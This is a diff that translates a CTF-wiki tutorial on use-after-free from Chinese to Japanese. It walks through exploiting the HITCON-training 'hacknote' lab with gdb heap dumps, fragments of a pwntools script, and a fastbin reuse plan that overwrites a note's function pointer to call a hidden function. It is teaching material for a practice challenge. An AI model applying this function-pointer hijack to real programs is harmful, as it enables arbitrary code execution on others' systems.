@@ -2,16 +2,16 @@
 
 ## 原理
 
-简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况
+簡単に言えば、Use After Free は文字どおりの意味で、メモリブロックが解放された後に再び使われることです。ただし実際には、次のようないくつかのケースがあります。
 
-- 内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。
-- 内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么**程序很有可能可以正常运转**。
-- 内存块被释放后，其对应的指针没有被设置为NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，**就很有可能会出现奇怪的问题**。
+- メモリブロックが解放された後、対応するポインタが NULL に設定され、その後再び使われた場合、当然プログラムはクラッシュします。
+- メモリブロックが解放された後、対応するポインタが NULL に設定されず、次に使われる前にこのメモリブロックを書き換えるコードがなければ、**プログラムはおそらく正常に動作します**。
+- メモリブロックが解放された後、対応するポインタが NULL に設定されず、次に使われる前にこのメモリを書き換えるコードがあれば、プログラムが再びこのメモリを使うとき、**おかしな問題が起きる可能性が高くなります**。
 
 
-而我们一般所指的 **Use After Free** 漏洞主要是后两种。此外，**我们一般称被释放后没有被设置为NULL的内存指针为dangling pointer。**
+一般に **Use After Free** 脆弱性と言うときは、主に後の 2 つを指します。また、**解放された後に NULL に設定されないメモリポインタを、一般にダングリングポインタ(dangling pointer)と呼びます。**
 
-这里给出一个简单的例子
+簡単な例を挙げます。
 
 ```c++
 #include <stdio.h>
@@ -41,7 +41,7 @@ int main() {
 }
 ```
 
-运行结果如下
+実行結果は次のとおりです。
 
 ```shell
 ➜  use_after_free git:(use_after_free) ✗ ./use_after_free                      
@@ -52,13 +52,13 @@ this pogram will crash...
 [1]    38738 segmentation fault (core dumped)  ./use_after_free
 ```
 
-## 例子
+## 例
 
-这里我们以 HITCON-training 中的 [lab 10 hacknote](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/use_after_free/hitcon-training-hacknote) 为例。
+ここでは HITCON-training の [lab 10 hacknote](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/use_after_free/hitcon-training-hacknote) を例にします。
 
-### 功能分析
+### 機能の分析
 
-我们可以简单分析下程序，可以看出在程序的开头有个menu函数，其中有
+プログラムを簡単に分析すると、プログラムの冒頭に menu 関数があり、その中に次のコードがあることがわかります。
 
 ```c
   puts(" 1. Add note          ");
@@ -67,20 +67,20 @@ this pogram will crash...
   puts(" 4. Exit              ");
 ```
 
-故而程序应该主要有3个功能。之后程序会根据用户的输入执行相应的功能。
+したがって、プログラムには主に 3 つの機能があるはずです。その後、プログラムはユーザの入力に応じて対応する機能を実行します。
 
 #### add_note
 
-根据程序，我们可以看出程序最多可以添加5个note。每个note有两个字段: `void (*printnote)();` 与`char *content;`，其中`printnote`会被设置为一个函数，其函数功能为输出 `content` 具体的内容。
+プログラムから、最大 5 個の note を追加できることがわかります。各 note には 2 つのフィールド `void (*printnote)();` と `char *content;` があり、`printnote` には `content` の具体的な内容を出力する関数が設定されます。
 
-note的结构体定义如下:
+note の構造体定義は次のとおりです。
 ```c
 struct note {
   void (*printnote)();
   char *content;
 };
 ```
-add_note 函数代码如下:
+add_note 関数のコードは次のとおりです。
 ```c++
 unsigned int add_note()
 {
@@ -132,7 +132,7 @@ unsigned int add_note()
 
 #### print_note
 
-print_note就是简单的根据给定的note的索引来输出对应索引的note的内容。
+print_note は、指定された note のインデックスに従って、対応する note の内容を出力するだけの関数です。
 
 ```c
 unsigned int print_note()
@@ -158,7 +158,7 @@ unsigned int print_note()
 
 #### delete_note
 
-delete_note 会根据给定的索引来释放对应的note。但是值得注意的是，在 删除的时候，只是单纯进行了free，而没有设置为NULL，那么显然，这里是存在Use After Free的情况的。
+delete_note は、指定されたインデックスに従って対応する note を解放します。ただし注目すべきことに、削除のとき単に free しているだけで NULL には設定していないため、ここには明らかに Use After Free が存在します。
 
 ```c
 unsigned int del_note()
@@ -186,14 +186,14 @@ unsigned int del_note()
 }
 ```
 
-### 利用分析
+### 攻撃の分析
 
-我们可以看到 Use After Free 的情况确实可能会发生，那么怎么可以让它发生并且进行利用呢？需要同时注意的是，这个程序中还有一个magic函数，我们有没有可能来通过use after free 来使得这个程序执行magic函数呢？**一个很直接的想法是修改note的`printnote`字段为magic函数的地址，从而实现在执行`printnote` 的时候执行magic函数。** 那么该怎么执行呢？                                                                         
+Use After Free は確かに起こりうることがわかりました。では、どうすればそれを発生させて攻撃に利用できるでしょうか。また、このプログラムには magic 関数もあることに注意してください。use after free を使って、このプログラムに magic 関数を実行させることはできないでしょうか。**直接的な考えとしては、note の `printnote` フィールドを magic 関数のアドレスに書き換え、`printnote` を実行するときに magic 関数を実行させる方法があります。** では、どう実行させればよいでしょうか。
 
-我们可以简单来看一下每一个note生成的具体流程
+各 note が生成される具体的な流れを簡単に見てみましょう。
 
-1. 程序申请8字节内存用来存放note中的printnote以及content指针。
-2. 程序根据输入的size来申请指定大小的内存，然后用来存储content。
+1. プログラムは 8 バイトのメモリを確保し、note 内の printnote と content のポインタを格納します。
+2. プログラムは入力された size に従って指定サイズのメモリを確保し、content を格納するのに使います。
 
            +-----------------+                       
            |   printnote     |                       
@@ -205,19 +205,19 @@ unsigned int del_note()
                                                   |                |
                                                   +----------------+
 
-那么，根据我们之前在堆的实现中所学到的，显然note是一个fastbin chunk（大小为16字节）。我们的目的是希望一个note的put字段为magic的函数地址，那么我们必须想办法让某个note的printnote指针被覆盖为magic地址。由于程序中只有唯一的地方对printnote进行赋值。所以我们必须利用写real content的时候来进行覆盖。具体采用的思路如下
+これまでヒープの実装で学んだことから、note が fastbin chunk(サイズ 16 バイト)であることは明らかです。目的は、ある note の put フィールドを magic 関数のアドレスにすることなので、何とかしてある note の printnote ポインタを magic のアドレスで上書きする必要があります。プログラム中で printnote に代入している箇所は 1 か所だけなので、real content を書き込むときに上書きするしかありません。具体的な方針は次のとおりです。
 
-- 申请note0，real content size为16（大小与note大小所在的bin不一样即可）
-- 申请note1，real content size为16（大小与note大小所在的bin不一样即可）
-- 释放note0
-- 释放note1
-- 此时，大小为16的fast bin chunk中链表为note1->note0
-- 申请note2，并且设置real content的大小为8，那么根据堆的分配规则
-  - note2其实会分配note1对应的内存块。
-  - real content 对应的chunk其实是note0。
-- 如果我们这时候向note2 real content的chunk部分写入magic的地址，那么由于我们没有note0为NULL。当我们再次尝试输出note0的时候，程序就会调用magic函数。
+- note0 を確保する。real content の size は 16(note のサイズが属する bin とは別のサイズであればよい)
+- note1 を確保する。real content の size は 16(note のサイズが属する bin とは別のサイズであればよい)
+- note0 を解放する
+- note1 を解放する
+- このとき、サイズ 16 の fast bin chunk のリストは note1->note0 になる
+- note2 を確保し、real content のサイズを 8 にすると、ヒープの確保規則により次のようになる
+  - note2 には、実際には note1 に対応するメモリブロックが確保される。
+  - real content に対応するチャンクは、実際には note0 になる。
+- このとき note2 の real content のチャンク部分に magic のアドレスを書き込めば、note0 は NULL にされていないため、再び note0 を出力しようとしたときにプログラムが magic 関数を呼び出す。
 
-### 利用脚本
+### 攻撃スクリプト
 
 ```python
 #!/usr/bin/env python
@@ -267,9 +267,9 @@ printnote(0) # print note 0
 r.interactive()
 ```
 
-我们可以具体看一下执行的流程，首先先下断点
+実行の流れを具体的に見てみましょう。まずブレークポイントを設定します。
 
-**两处malloc下断点**
+**malloc の 2 か所にブレークポイントを設定**
 
 ```shell
 gef➤  b *0x0804875C
@@ -278,7 +278,7 @@ gef➤  b *0x080486CA
 Breakpoint 2 at 0x80486ca
 ```
 
-**两处free下断点**
+**free の 2 か所にブレークポイントを設定**
 
 ```shell
 gef➤  b *0x08048893
@@ -287,7 +287,7 @@ gef➤  b *0x080488A9
 Breakpoint 4 at 0x80488a9
 ```
 
-然后继续执行程序，可以看出申请note0时，所申请到的内存块地址为0x0804b008。（eax存储函数返回值）
+続けてプログラムを実行すると、note0 を確保したとき、確保されたメモリブロックのアドレスは 0x0804b008 であることがわかります。(eax には関数の戻り値が入ります)
 
 ```asm
 $eax   : 0x0804b008  →  0x00000000
@@ -340,7 +340,7 @@ IS_MMAPPED flag: Off
 NON_MAIN_ARENA flag: Off
 ```
 
-**申请note 0的content的地址为0x0804b018**
+**note 0 の content として確保されたアドレスは 0x0804b018**
 
 ```asm
 $eax   : 0x0804b018  →  0x00000000
@@ -393,9 +393,9 @@ IS_MMAPPED flag: Off
 NON_MAIN_ARENA flag: Off
 ```
 
-类似的，我们可以得到note1的地址以及其content的地址分别为0x0804b040 和0x0804b050。
+同様に、note1 のアドレスとその content のアドレスは、それぞれ 0x0804b040 と 0x0804b050 だとわかります。
 
-同时，我们还可以看到note0与note1对应的content确实是相应的内存块。
+また、note0 と note1 に対応する content が確かに対応するメモリブロックであることも確認できます。
 
 ```asm
 gef➤  grep aaaa
@@ -408,7 +408,7 @@ gef➤  grep ddaa
   0x804b050 - 0x804b054  →   "ddaa" 
 ```
 
-下面就是free的过程了。我们可以依次发现首先，note0的content被free
+次は free の過程です。順に見ていくと、まず note0 の content が free されます。
 
 ```asm
  →  0x8048893 <del_note+143>   call   0x80484c0 <free@plt>
@@ -423,7 +423,7 @@ gef➤  grep ddaa
 
 ```
 
-然后是note0本身
+次に note0 自身です。
 
 ```asm
  →  0x80488a9 <del_note+165>   call   0x80484c0 <free@plt>
@@ -437,7 +437,7 @@ gef➤  grep ddaa
 0xffffcf20│+0x00: 0x0804b008  →  0x0804865b  →  <print_note_content+0> push ebp	 ← $esp
 ```
 
-当delete结束后，我们观看一下bins，可以发现，确实其被存放在对应的fast bin中，
+delete が終わった後で bins を見ると、確かに対応する fast bin に格納されていることがわかります。
 
 ```c++
 gef➤  heap bins
@@ -452,7 +452,7 @@ Fastbins[idx=6, size=0x20] 0x00
 
 ```
 
-当我们将note1也全部删除完毕后，再次观看bins。可以看出，后删除的chunk块确实处于表头。
+note1 もすべて削除した後で、再び bins を見ます。後から削除したチャンクが確かにリストの先頭にあることがわかります。
 
 ```asm
 gef➤  heap bins
@@ -467,9 +467,9 @@ Fastbins[idx=6, size=0x20] 0x00
 
 ```
 
-那么，此时即将要申请note2，我们可以看下note2都申请到了什么内存块，如下
+このとき、これから note2 を確保します。note2 にどのメモリブロックが確保されるかを見てみましょう。
 
-**申请note2对应的内存块为0x804b040，其实就是note1对应的内存地址。**
+**note2 に対応するメモリブロックは 0x804b040 で、これは実は note1 に対応するメモリアドレスです。**
 
 ```asm
 [+] Heap-Analysis - malloc(8)=0x804b040
@@ -500,7 +500,7 @@ $eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume
 
 ```
 
-**申请note2的content的内存地址为0x804b008，就是note0对应的地址，即此时我们向note2的content写内容，就会将note0的put字段覆盖。**
+**note2 の content として確保されたメモリアドレスは 0x804b008 で、これは note0 に対応するアドレスです。つまり、ここで note2 の content に書き込むと、note0 の put フィールドが上書きされます。**
 
 ```asm
 gef➤  n 1
@@ -531,14 +531,14 @@ $eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume
  →  0x8048761 <add_note+235>   add    esp, 0x10
 ```
 
-我们来具体检验一下，看一下覆盖前的情况，可以看到该内存块的`printnote`指针已经被置为NULL了，这是由fastbin的free机制决定的。
+具体的に確かめてみましょう。上書き前の状態を見ると、このメモリブロックの `printnote` ポインタはすでに NULL になっています。これは fastbin の free の仕組みによるものです。
 
 ```asm
 gef➤  x/2xw 0x804b008
 0x804b008:	0x00000000	0x0804b018
 ```
 
-覆盖后，具体的值如下
+上書き後の具体的な値は次のとおりです。
 
 ```asm
 gef➤  x/2xw 0x804b008
@@ -547,9 +547,9 @@ gef➤  x/i 0x08048986
    0x8048986 <magic>:	push   ebp
 ```
 
-可以看出，确实已经被覆盖为我们所想要的magic函数了。
+確かに、狙いどおり magic 関数で上書きされていることがわかります。
 
-最后执行的效果如下
+最終的な実行結果は次のとおりです。
 
 ```shell
 [+] Starting local process './hacknote': pid 35030
@@ -564,7 +564,7 @@ flag{use_after_free}----------------------
 ----------------------
 ```
 
-同时，我们还可以借助gef的heap-analysis-helper 来看一下整体的堆的申请与释放的情况，如下
+また、gef の heap-analysis-helper を使うと、ヒープ全体の確保と解放の様子を次のように確認できます。
 
 ```asm
 gef➤  heap-analysis-helper 
@@ -601,9 +601,9 @@ process 36249 is executing new program: /bin/cat
 [Inferior 3 (process 36249) exited normally]
 ```
 
-这里第一个输出了两次，应该是gef工具的问题。
+最初の出力が 2 回出ていますが、gef ツールの問題だと思われます。
 
-## 题目
+## 問題
 
 - 2016 HCTF fheap
 
